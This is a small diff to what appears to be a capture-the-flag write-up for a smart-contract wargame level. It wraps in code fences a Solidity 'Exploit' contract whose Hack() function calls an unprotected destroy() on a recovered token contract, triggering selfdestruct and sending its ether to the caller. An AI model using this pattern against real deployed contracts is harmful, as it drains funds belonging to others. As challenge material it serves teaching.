@@ -17,19 +17,17 @@ There we can click internal transactions and see two contracts created by taking
 
 
 Solution:
-
+```
 contract Exploit{
-
     Token simpleToken;
     constructor(address _target){
         simpleToken=Token(_target);
     }
-
     function Hack()public{
         simpleToken.destroy(msg.sender);
     }
-
 }
+```
 put the address of the contract you got in while deploying Exploit and call Hack() then which will selfdestruct and send the ether to msg.seder which is us.
 
 Key Takeaways:
